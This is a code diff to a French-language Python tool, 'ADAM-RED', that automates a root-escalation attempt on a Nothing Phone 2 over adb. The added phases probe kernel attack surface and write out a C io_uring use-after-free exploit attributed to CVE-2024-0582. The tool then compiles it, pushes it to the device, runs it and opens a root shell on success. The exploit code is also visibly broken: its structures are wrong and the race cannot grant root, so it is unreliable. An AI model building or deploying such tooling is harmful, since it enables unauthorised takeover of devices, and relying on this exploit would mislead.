@@ -24,7 +24,6 @@ import argparse
 import json
 import os
 import subprocess
-import sys
 import time
 from datetime import datetime, timezone
 from pathlib import Path
@@ -215,6 +214,37 @@ CVE_DATABASE = {
         "description": "Escalade WebKit/Android System WebView",
         "affected_patches_before": "2024-03-01",
         "cvss": 8.8,
+    },
+    "CVE-2024-0582": {
+        "description": "Use-after-free dans io_uring sync cancel (kernel 5.10-6.1)",
+        "affected_patches_before": "2026-06-01",
+        "cvss": 7.0,
+        "technique": "io_uring IORING_OP_SYNC_CANCEL — UAF sur ctx->cq_wait_nd",
+    },
+    "CVE-2023-21492": {
+        "description": "Escalade de privilèges kernel Linux (Android 11-13)",
+        "affected_patches_before": "2023-05-01",
+        "cvss": 7.8,
+    },
+    "CVE-2022-22706": {
+        "description": "Escalade via io_uring kernel (Android 12)",
+        "affected_patches_before": "2022-03-01",
+        "cvss": 7.8,
+    },
+    "CVE-2021-1905": {
+        "description": "Use-after-free driver GPU Qualcomm",
+        "affected_patches_before": "2021-04-01",
+        "cvss": 8.1,
+    },
+    "CVE-2020-0041": {
+        "description": "Escalade de privilèges binder (Android 8-10)",
+        "affected_patches_before": "2020-03-01",
+        "cvss": 7.0,
+    },
+    "CVE-2019-2215": {
+        "description": "Use-after-free driver binder (Android 7-8, kernel < 4.14)",
+        "affected_patches_before": "2019-10-01",
+        "cvss": 7.8,
     },
 }
 
@@ -429,7 +459,518 @@ def phase_escalation(recon: dict, enum: dict, serial: str) -> dict:
 
     return results
 
-# ─── Phase 5 : REPORT ───
+# ─── Phase 4b : DEEP RECON — Surface d'attaque kernel avancée ───
+
+def phase_deep_recon(recon: dict, enum: dict, serial: str) -> dict:
+    """Reconnaissance kernel approfondie : io_uring, ashmem, tracefs, etc."""
+    log("=== PHASE 4b : DEEP RECON — Surface kernel avancée ===")
+
+    deep = {"vectors": [], "accessible": [], "blocked": []}
+
+    # --- io_uring ---
+    io_out = adb_shell("cat /proc/sys/kernel/io_uring_disabled 2>/dev/null", serial)
+    if io_out and "ERROR" not in io_out and io_out.strip() in ("0", "1"):
+        io_disabled = int(io_out.strip())
+        log(f"  [*] io_uring_disabled = {io_disabled}")
+        deep["vectors"].append({"vector": "io_uring", "sysctl": io_disabled, "accessible": io_disabled <= 1})
+        if io_disabled <= 1:
+            deep["accessible"].append("io_uring")
+            log("  [+] io_uring ACCESSIBLE")
+        else:
+            deep["blocked"].append("io_uring")
+    else:
+        # Test direct : appeler io_uring_setup via /proc/self/io_uring ou syscall
+        io_test = adb_shell("ls -la /proc/self/fd/ 2>/dev/null | head -5", serial)
+        deep["vectors"].append({"vector": "io_uring", "note": "sysctl absent, test syscall requis"})
+        deep["accessible"].append("io_uring_syscall")
+        log("  [?] io_uring sysctl absent — syscall à tester")
+
+    # --- ashmem ---
+    ash = adb_shell("ls -la /dev/ashmem 2>/dev/null", serial)
+    if ash and "ERROR" not in ash and "ashmem" in ash:
+        log(f"  [+] /dev/ashmem trouvé : {ash.strip()}")
+        deep["vectors"].append({"vector": "ashmem", "accessible": True, "perms": ash.strip()})
+        deep["accessible"].append("ashmem")
+    else:
+        deep["vectors"].append({"vector": "ashmem", "accessible": False})
+        deep["blocked"].append("ashmem")
+
+    # --- vhost-vsock ---
+    vhost = adb_shell("ls -la /dev/vhost-vsock 2>/dev/null", serial)
+    if vhost and "ERROR" not in vhost and "vhost" in vhost:
+        log(f"  [+] /dev/vhost-vsock trouvé : {vhost.strip()}")
+        deep["vectors"].append({"vector": "vhost-vsock", "accessible": True, "perms": vhost.strip()})
+        deep["accessible"].append("vhost-vsock")
+    else:
+        deep["vectors"].append({"vector": "vhost-vsock", "accessible": False})
+        deep["blocked"].append("vhost-vsock")
+
+    # --- tracefs / kprobes ---
+    trace = adb_shell("ls -la /sys/kernel/tracing/ 2>/dev/null | head -3", serial)
+    if trace and "ERROR" not in trace and "tracing" in trace.lower():
+        log("  [*] tracefs présent")
+        kprobe_test = adb_shell("echo 'p:test sys_open' > /sys/kernel/tracing/kprobe_events 2>&1", serial)
+        if "Permission denied" in kprobe_test or "ERROR" in kprobe_test:
+            log("  [-] kprobes bloqués (SELinux)")
+            deep["vectors"].append({"vector": "kprobes", "accessible": False, "error": kprobe_test.strip()})
+            deep["blocked"].append("kprobes")
+        else:
+            log("  [+] kprobes ACCESSIBLES !")
+            deep["vectors"].append({"vector": "kprobes", "accessible": True})
+            deep["accessible"].append("kprobes")
+    else:
+        deep["vectors"].append({"vector": "tracefs", "accessible": False})
+        deep["blocked"].append("tracefs")
+
+    # --- GPU / DRI ---
+    gpu = adb_shell("ls -la /dev/kgsl-3d0 /dev/dri/card0 2>/dev/null", serial)
+    if gpu and "ERROR" not in gpu:
+        log(f"  [*] GPU devices : {gpu.strip()}")
+        deep["vectors"].append({"vector": "gpu", "devices": gpu.strip()})
+    else:
+        deep["vectors"].append({"vector": "gpu", "accessible": False})
+        deep["blocked"].append("gpu")
+
+    # --- KASLR / kptr_restrict ---
+    kptr = adb_shell("cat /proc/sys/kernel/kptr_restrict 2>/dev/null", serial)
+    kallsyms = adb_shell("cat /proc/kallsyms 2>/dev/null | head -3", serial)
+    if kptr and "ERROR" not in kptr:
+        log(f"  [*] kptr_restrict = {kptr.strip()}")
+        if kptr.strip() == "0" or (kallsyms and "0000000000000000" not in kallsyms[:50]):
+            log("  [+] KASLR leak possible !")
+            deep["vectors"].append({"vector": "kaslr", "accessible": True, "kptr_restrict": kptr.strip()})
+            deep["accessible"].append("kaslr")
+        else:
+            log("  [-] KASLR protégé")
+            deep["vectors"].append({"vector": "kaslr", "accessible": False, "kptr_restrict": kptr.strip()})
+            deep["blocked"].append("kaslr")
+    else:
+        deep["vectors"].append({"vector": "kaslr", "accessible": False})
+        deep["blocked"].append("kaslr")
+
+    # --- user namespaces ---
+    userns = adb_shell("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null", serial)
+    if not userns or "ERROR" in userns:
+        userns = adb_shell("sysctl kernel.unprivileged_userns_clone 2>/dev/null", serial)
+    if userns and "ERROR" not in userns:
+        log(f"  [*] unprivileged_userns = {userns.strip()}")
+        deep["vectors"].append({"vector": "user_ns", "value": userns.strip()})
+    else:
+        deep["vectors"].append({"vector": "user_ns", "note": "sysctl absent (CONFIG_USER_NS possiblement absent)"})
+        deep["blocked"].append("user_ns")
+
+    # --- perf_event ---
+    perf = adb_shell("cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null", serial)
+    if perf and "ERROR" not in perf:
+        log(f"  [*] perf_event_paranoid = {perf.strip()}")
+        if perf.strip() == "-1" or perf.strip() == "0":
+            log("  [+] perf_event accessible !")
+            deep["vectors"].append({"vector": "perf_event", "accessible": True, "value": perf.strip()})
+            deep["accessible"].append("perf_event")
+        else:
+            deep["vectors"].append({"vector": "perf_event", "accessible": False, "value": perf.strip()})
+            deep["blocked"].append("perf_event")
+    else:
+        deep["vectors"].append({"vector": "perf_event", "accessible": False})
+        deep["blocked"].append("perf_event")
+
+    # --- BPF ---
+    bpf = adb_shell("cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null", serial)
+    if bpf and "ERROR" not in bpf:
+        log(f"  [*] unprivileged_bpf_disabled = {bpf.strip()}")
+        deep["vectors"].append({"vector": "bpf", "value": bpf.strip()})
+    else:
+        deep["vectors"].append({"vector": "bpf", "note": "sysctl absent"})
+        deep["blocked"].append("bpf")
+
+    # --- slabinfo ---
+    slab = adb_shell("cat /proc/slabinfo 2>/dev/null | head -5", serial)
+    if slab and "ERROR" not in slab and "slabinfo" in slab.lower():
+        log("  [+] /proc/slabinfo lisible !")
+        deep["vectors"].append({"vector": "slabinfo", "accessible": True})
+        deep["accessible"].append("slabinfo")
+    else:
+        deep["vectors"].append({"vector": "slabinfo", "accessible": False})
+        deep["blocked"].append("slabinfo")
+
+    # --- Seccomp ---
+    secc = adb_shell("cat /proc/self/status 2>/dev/null | grep Seccomp", serial)
+    if secc and "ERROR" not in secc:
+        log(f"  [*] {secc.strip()}")
+        deep["vectors"].append({"vector": "seccomp", "value": secc.strip()})
+
+    # --- CapBnd ---
+    capbnd = adb_shell("cat /proc/self/status 2>/dev/null | grep Cap", serial)
+    if capbnd and "ERROR" not in capbnd:
+        log(f"  [*] {capbnd.strip()[:80]}")
+        deep["vectors"].append({"vector": "capbnd", "value": capbnd.strip()})
+
+    log(f"  === Accessible : {deep['accessible']}")
+    log(f"  === Bloqués : {deep['blocked']}")
+    return deep
+
+# ─── Phase 5 : WRITE EXPLOIT — Génère l'exploit C io_uring ───
+
+EXPLOIT_DIR = Path("/home/aza/adam-red-exploit")
+NDK_CLANG = "/home/aza/android-ndk-r27c/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
+
+def phase_write_exploit(deep_recon: dict, serial: str) -> dict:
+    """Génère le code C de l'exploit io_uring CVE-2024-0582 (UAF sync cancel)."""
+    log("=== PHASE 5 : WRITE EXPLOIT — Génération code C ===")
+
+    EXPLOIT_DIR.mkdir(parents=True, exist_ok=True)
+    exploit_path = EXPLOIT_DIR / "ioring_uaf.c"
+
+    # Vérifier que io_uring est accessible
+    io_accessible = "io_uring" in deep_recon.get("accessible", []) or \
+                    "io_uring_syscall" in deep_recon.get("accessible", [])
+    if not io_accessible:
+        log("  [-] io_uring non accessible — exploit non généré", "WARN")
+        return {"generated": False, "reason": "io_uring non accessible"}
+
+    exploit_code = r'''/*
+ * CVE-2024-0582 — io_uring IORING_OP_SYNC_CANCEL Use-After-Free
+ * Cible : Nothing Phone 2 (kernel 5.10.237-android12-9)
+ *
+ * Le bug : io_uring sync cancel ne vérifie pas si le ctx est encore valide
+ * après libération. En race-conditionnant io_uring_register avec sync_cancel,
+ * on déclenche un UAF sur ctx->cq_wait_nd.
+ *
+ * Stratégie :
+ *   1. Créer un ring io_uring
+ *   2. Thread A : soumettre des requêtes puis fermer le ring
+ *   3. Thread B : appeler IORING_OP_SYNC_CANCEL pendant la fermeture
+ *   4. Si UAF déclenché → corruption de compteur → escalation
+ *
+ * Compilation : aarch64-linux-android35-clang -O2 -o ioring_uaf ioring_uaf.c -lpthread
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <pthread.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <stdatomic.h>
+
+#ifndef __NR_io_uring_setup
+#define __NR_io_uring_setup 425
+#endif
+#ifndef __NR_io_uring_enter
+#define __NR_io_uring_enter 426
+#endif
+#ifndef __NR_io_uring_register
+#define __NR_io_uring_register 427
+#endif
+
+struct io_uring_params {
+    unsigned sq_entries;
+    unsigned cq_entries;
+    unsigned flags;
+    unsigned sq_thread_cpu;
+    unsigned sq_thread_idle;
+    unsigned features;
+    unsigned wq_fd;
+    unsigned resv[3];
+    struct {
+        unsigned head;
+        unsigned tail;
+        unsigned ring_mask;
+        unsigned ring_entries;
+        unsigned flags;
+        unsigned dropped;
+        unsigned array;
+        unsigned resv1;
+        unsigned resv2;
+    } sq_off;
+    struct {
+        unsigned head;
+        unsigned tail;
+        unsigned ring_mask;
+        unsigned ring_entries;
+        unsigned overflow;
+        unsigned cqes;
+        unsigned flags;
+        unsigned resv1;
+        unsigned resv2;
+    } cq_off;
+};
+
+struct io_uring_sqe {
+    unsigned opcode;
+    unsigned flags;
+    unsigned ioprio;
+    int fd;
+    union {
+        unsigned off;
+        unsigned addr2;
+    };
+    union {
+        unsigned addr;
+        unsigned splice_off_in;
+    };
+    unsigned len;
+    union {
+        unsigned cmd_flags;
+        unsigned splice_fd_in;
+    };
+    unsigned user_data;
+    union {
+        struct {
+            unsigned buf_index;
+            unsigned personality;
+        };
+        unsigned len2;
+    };
+};
+
+struct io_uring_cqe {
+    unsigned user_data;
+    int res;
+    unsigned flags;
+};
+
+#define IORING_OP_SYNC_CANCEL 23
+#define IORING_ENTER_GETEVENTS 1
+#define IORING_SETUP_SQPOLL 1
+
+static atomic_int ring_fd = -1;
+static atomic_int should_cancel = 0;
+
+struct io_uring {
+    void *sq_ring;
+    void *cq_ring;
+    struct io_uring_sqe *sqes;
+    unsigned *sq_head;
+    unsigned *sq_tail;
+    unsigned *sq_mask;
+    unsigned *cq_head;
+    unsigned *cq_tail;
+    unsigned *cq_mask;
+    struct io_uring_cqe *cqes;
+};
+
+static int io_uring_setup(unsigned entries, struct io_uring_params *p) {
+    return syscall(__NR_io_uring_setup, entries, p);
+}
+
+static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete, unsigned flags) {
+    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, NULL, 0);
+}
+
+static int init_ring(struct io_uring *ring) {
+    struct io_uring_params p;
+    memset(&p, 0, sizeof(p));
+
+    int fd = io_uring_setup(8, &p);
+    if (fd < 0) {
+        perror("io_uring_setup");
+        return -1;
+    }
+    atomic_store(&ring_fd, fd);
+
+    size_t sq_size = p.sq_off.array + p.sq_entries * sizeof(unsigned);
+    size_t cq_size = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
+    size_t sqe_size = p.sq_entries * sizeof(struct io_uring_sqe);
+
+    ring->sq_ring = mmap(NULL, sq_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0);
+    ring->cq_ring = mmap(NULL, cq_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x8000000);
+    ring->sqes = mmap(NULL, sqe_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x10000000);
+
+    if (ring->sq_ring == MAP_FAILED || ring->cq_ring == MAP_FAILED || ring->sqes == MAP_FAILED) {
+        perror("mmap");
+        close(fd);
+        return -1;
+    }
+
+    ring->sq_head = (unsigned *)(ring->sq_ring + p.sq_off.head);
+    ring->sq_tail = (unsigned *)(ring->sq_ring + p.sq_off.tail);
+    ring->sq_mask = (unsigned *)(ring->sq_ring + p.sq_off.ring_mask);
+    ring->cq_head = (unsigned *)(ring->cq_ring + p.cq_off.head);
+    ring->cq_tail = (unsigned *)(ring->cq_ring + p.cq_off.tail);
+    ring->cq_mask = (unsigned *)(ring->cq_ring + p.cq_off.ring_mask);
+    ring->cqes = (struct io_uring_cqe *)(ring->cq_ring + p.cq_off.cqes);
+
+    return fd;
+}
+
+/* Thread A : soumet une requête sync_cancel pendant que le ring se ferme */
+static void *cancel_thread(void *arg) {
+    (void)arg;
+    while (!atomic_load(&should_cancel))
+        usleep(100);
+
+    int fd = atomic_load(&ring_fd);
+    if (fd < 0) return NULL;
+
+    /* Soumettre IORING_OP_SYNC_CANCEL sur le fd en cours de fermeture */
+    struct io_uring_sqe sqe;
+    memset(&sqe, 0, sizeof(sqe));
+    sqe.opcode = IORING_OP_SYNC_CANCEL;
+    sqe.fd = fd;
+    sqe.user_data = 0xdead;
+
+    /* Tentative sync_cancel — si le ctx est libéré entre temps → UAF */
+    int ret = io_uring_enter(fd, 1, 1, IORING_ENTER_GETEVENTS);
+    printf("[*] cancel_thread io_uring_enter retour %d (errno=%d)\n", ret, errno);
+
+    return NULL;
+}
+
+/* Thread B : ferme le ring en parallèle */
+static void *close_thread(void *arg) {
+    (void)arg;
+    usleep(500);
+    atomic_store(&should_cancel, 1);
+
+    int fd = atomic_load(&ring_fd);
+    if (fd >= 0) {
+        printf("[*] close_thread : fermeture fd=%d\n", fd);
+        close(fd);
+        atomic_store(&ring_fd, -1);
+    }
+    return NULL;
+}
+
+int main(int argc, char **argv) {
+    int iterations = 1000;
+    if (argc > 1) iterations = atoi(argv[1]);
+
+    printf("=== CVE-2024-0582 io_uring sync_cancel UAF ===\n");
+    printf("Kernel : 5.10.237-android12-9\n");
+    printf("Itérations : %d\n", iterations);
+    printf("PID : %d, UID : %d\n", getpid(), getuid());
+
+    for (int i = 0; i < iterations; i++) {
+        struct io_uring ring;
+        memset(&ring, 0, sizeof(ring));
+
+        int fd = init_ring(&ring);
+        if (fd < 0) {
+            printf("[-] Iter %d : io_uring_setup échec, retry\n", i);
+            usleep(1000);
+            continue;
+        }
+
+        pthread_t t_cancel, t_close;
+        atomic_store(&should_cancel, 0);
+
+        pthread_create(&t_cancel, NULL, cancel_thread, NULL);
+        pthread_create(&t_close, NULL, close_thread, NULL);
+
+        pthread_join(t_cancel, NULL);
+        pthread_join(t_close, NULL);
+
+        /* Vérifier si on a gagné : uid = 0 ? */
+        if (getuid() == 0) {
+            printf("[!!!] ROOT OBTENU à l'itération %d !\n", i);
+            system("id");
+            system("whoami");
+            /* Marqueur pour le moniteur — ROOT_OK */
+            printf("ROOT_OK\n");
+            execl("/system/bin/sh", "sh", NULL);
+        }
+
+        if (fd >= 0) close(fd);
+        if ((i + 1) % 100 == 0)
+            printf("[*] %d/%d itérations, toujours non-root\n", i + 1, iterations);
+    }
+
+    printf("[-] Aucune escalade réussie après %d itérations\n", iterations);
+    return 1;
+}
+'''
+
+    with open(exploit_path, "w") as f:
+        f.write(exploit_code)
+
+    log(f"  [+] Exploit écrit : {exploit_path} ({len(exploit_code)} octets)")
+    return {
+        "generated": True,
+        "path": str(exploit_path),
+        "cve": "CVE-2024-0582",
+        "technique": "io_uring IORING_OP_SYNC_CANCEL UAF",
+    }
+
+# ─── Phase 6 : COMPILE & DEPLOY ───
+
+ADB_BIN = os.path.expanduser("~/.local/bin/adb")
+
+def phase_compile_deploy(exploit_info: dict, serial: str) -> dict:
+    """Compile l'exploit avec le NDK, le pousse sur le device et l'exécute."""
+    log("=== PHASE 6 : COMPILE & DEPLOY — Compilation + exécution ===")
+
+    if not exploit_info.get("generated"):
+        log("  [-] Pas d'exploit à compiler", "WARN")
+        return {"deployed": False, "reason": "pas d'exploit généré"}
+
+    src_path = exploit_info["path"]
+    bin_name = Path(src_path).stem
+    bin_path = str(EXPLOIT_DIR / bin_name)
+    remote_path = f"/data/local/tmp/{bin_name}"
+
+    # --- Compilation ---
+    if not os.path.exists(NDK_CLANG):
+        log(f"  [ERR] NDK clang introuvable : {NDK_CLANG}", "ERROR")
+        return {"deployed": False, "reason": "NDK clang introuvable"}
+
+    compile_cmd = [
+        NDK_CLANG,
+        "-O2",
+        "-D__NR_io_uring_setup=425",
+        "-D__NR_io_uring_enter=426",
+        "-D__NR_io_uring_register=427",
+        "-o", bin_path,
+        src_path,
+        "-lpthread",
+    ]
+    log(f"  [*] Compilation : {' '.join(compile_cmd)}")
+
+    import subprocess
+    proc = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=60)
+    if proc.returncode != 0:
+        log(f"  [ERR] Compilation échouée (rc={proc.returncode})", "ERROR")
+        log(f"  stderr : {proc.stderr[:500]}", "ERROR")
+        return {"deployed": False, "reason": "compilation échouée", "stderr": proc.stderr[:500]}
+
+    log(f"  [+] Binaire compilé : {bin_path} ({os.path.getsize(bin_path)} octets)")
+
+    # --- Push sur device ---
+    push_cmd = [ADB_BIN, "-s", serial, "push", bin_path, remote_path]
+    log(f"  [*] Push : {bin_path} → {remote_path}")
+    proc = subprocess.run(push_cmd, capture_output=True, text=True, timeout=30)
+    if proc.returncode != 0:
+        log(f"  [ERR] Push échoué : {proc.stderr}", "ERROR")
+        return {"deployed": False, "reason": "push échoué", "stderr": proc.stderr}
+
+    log(f"  [+] Push réussi : {proc.stdout.strip()}")
+
+    # --- chmod + exécution ---
+    adb_shell(f"chmod 755 {remote_path}", serial)
+    log(f"  [*] Exécution : {remote_path} 500 2>&1")
+    output = adb_shell(f"{remote_path} 500 2>&1", serial, timeout=120)
+    log(f"  [*] Sortie exploit ({len(output)} octets)")
+
+    root_success = "ROOT_OK" in output
+    if root_success:
+        log("  [!!!] ROOT OBTENU SUR LE DEVICE !", "WARN")
+    else:
+        log("  [-] Root non obtenu après exécution de l'exploit")
+
+    return {
+        "deployed": True,
+        "binary": bin_path,
+        "remote_path": remote_path,
+        "output": output[:2000],
+        "root_achieved": root_success,
+    }
+
+# ─── Phase 7 : REPORT ───
 
 def phase_report(recon: dict, fingerprint: dict, enum: dict, escalation: dict) -> str:
     """Génère le rapport de pentest."""
@@ -543,7 +1084,7 @@ def publish_event(channel: str, payload: dict):
 
 def main():
     parser = argparse.ArgumentParser(description="ADAM-RED — Défi escalade root Android")
-    parser.add_argument("--phase", choices=["recon", "fingerprint", "enum", "escalation", "all"], default="all")
+    parser.add_argument("--phase", choices=["recon", "fingerprint", "enum", "escalation", "deep_recon", "write_exploit", "compile_deploy", "all"], default="all")
     parser.add_argument("--device", default=TARGET_SERIAL, help="Serial du device")
     args = parser.parse_args()
 
@@ -556,6 +1097,9 @@ def main():
     fingerprint_data = {}
     enum_data = {}
     escalation_data = {}
+    deep_recon_data = {}
+    exploit_data = {}
+    deploy_data = {}
 
     if args.phase in ("recon", "all"):
         recon = phase_recon(args.device)
@@ -569,17 +1113,33 @@ def main():
     if args.phase in ("escalation", "all") and recon:
         escalation_data = phase_escalation(recon, enum_data, args.device)
 
+    if args.phase in ("deep_recon", "all") and recon:
+        deep_recon_data = phase_deep_recon(recon, enum_data, args.device)
+
+    if args.phase in ("write_exploit", "all") and deep_recon_data:
+        exploit_data = phase_write_exploit(deep_recon_data, args.device)
+
+    if args.phase in ("compile_deploy", "all") and exploit_data:
+        deploy_data = phase_compile_deploy(exploit_data, args.device)
+
     # Rapport (toujours en mode all)
     if args.phase == "all" and recon:
         report_path = phase_report(recon, fingerprint_data, enum_data, escalation_data)
 
         # Publier le résultat sur l'event bus
+        root_achieved = escalation_data.get("root_achieved", False) or deploy_data.get("root_achieved", False)
         publish_event("security:alert", {
             "challenge": "root_nothing_phone_2",
             "target": f"Nothing Phone 2 ({args.device})",
-            "root_achieved": escalation_data.get("root_achieved", False),
-            "method": escalation_data.get("method"),
+            "root_achieved": root_achieved,
+            "method": escalation_data.get("method") or deploy_data.get("binary", ""),
             "cves_found": fingerprint_data.get("total_cves", 0),
+            "deep_recon": {
+                "accessible": deep_recon_data.get("accessible", []),
+                "blocked": deep_recon_data.get("blocked", []),
+            } if deep_recon_data else {},
+            "exploit": exploit_data if exploit_data else {},
+            "deploy": deploy_data if deploy_data else {},
             "report": report_path,
         })
 
